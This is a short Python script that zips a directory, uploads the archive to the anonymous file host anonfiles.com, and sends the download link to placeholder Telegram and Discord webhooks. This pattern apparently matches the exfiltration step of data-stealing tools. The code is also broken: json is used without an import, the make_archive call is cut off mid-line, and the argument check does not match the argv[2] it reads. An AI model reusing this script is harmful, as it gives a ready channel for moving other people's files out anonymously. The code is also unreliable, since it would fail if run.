import shutil, sys, requests

def helpmsg():
        print('usage: {} filedir zipfile'.format(sys.argv[0]))

def sendtele(webhookurl, url):
        messaget = webhookurl + 'the link is :' + url
        result = requests.get(messaget)
        try:
                result.raise_for_status()
        except requests.exceptions.HTTPError as e:
                print(e)
        else:
                print("sent with code {}.".format(result.status_code))

def senddiscord(webhookurl, url):
        headers = {'Content-type': 'application/json', 'Accept': 'text/plain'}
        payload = {"content": "the link is :" + url}
        result = requests.post(webhookurl, headers=headers, data=json.dumps(payload))
        try:
                result.raise_for_status()
        except requests.exceptions.HTTPError as e:
                print(e)
        else:
                print("sent with code {}.".format(result.status_code))

def uploadanon(file):
        files = {
                'file': (file, open(file + '.zip', 'rb')),
        }
        url = 'https://api.anonfiles.com/upload'
        response = requests.post(url, files=files)
        data = response.json()
        return data['data']['file']['url']['short']

if __name__ == '__main__':
        if len(sys.argv) < 2:
                helpmsg()
                exit()
        shutil.make_archive(sys.argv[2], format='zip', root_dir>
        anonlnk = uploadanon(sys.argv[2])
        sendtele('<webhook-telegram>', anonlnk)
        senddiscord('<webhook-discord>', anonlnk)
